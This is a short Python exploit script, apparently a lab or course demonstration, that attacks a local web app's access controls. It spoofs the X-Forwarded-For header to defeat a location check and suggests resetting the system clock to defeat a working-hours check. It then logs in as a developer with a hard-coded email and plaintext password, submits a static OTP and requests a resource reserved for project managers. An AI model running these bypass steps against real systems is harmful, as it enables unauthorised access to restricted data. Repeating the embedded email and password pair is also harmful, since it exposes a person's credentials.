import requests
from datetime import datetime

# Base URL of the application
BASE_URL = "http://127.0.0.1:5000"

# Developer's credentials
developer_credentials = {
    'Email': 'marriamnaeem435@gmail.com',  # Developer's email
    'Password': 'password'  # Developer's plaintext password
}

# Resource to exploit (resource intended for Project Managers)
restricted_resource = 'Project'

# Step 1: Bypass Location and Time Checks by Manipulating Headers
headers = {
    'X-Forwarded-For': '192.168.1.9',  # Fake IP to pass the location check
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
}

# Simulate working hours (9:00 AM to 11:00 PM)
# Step 2: Set system time on your server or environment to make it look like working hours.
# You can do this on a Unix-based machine with the command: sudo date -s "2024-12-23 09:30:00"

# Step 3: Login as Developer
session = requests.Session()

login_response = session.post(BASE_URL + "/", data=developer_credentials, headers=headers)

# Ensure OTP was sent and login succeeded
if "otp_input" in login_response.text:
    print("Login successful. Proceeding to OTP verification...")

    # Step 4: Submit OTP and Exploit RBAC
    # We'll directly use the generated OTP
    exploit_data = {
        'otp': '006',  # Static OTP for the demo
        'resource': restricted_resource  # Trying to access a restricted resource
    }

    exploit_response = session.post(BASE_URL + "/verify_otp_and_grant_access", data=exploit_data, headers=headers)

    # Step 5: Analyze Exploit Response
    if "Access Granted" in exploit_response.text:
        print(f"Attack successful! Developer accessed the restricted resource: {restricted_resource}")
    else:
        print("Access Denied: The attack failed.")
else:
    print("Login failed. Check your credentials.")
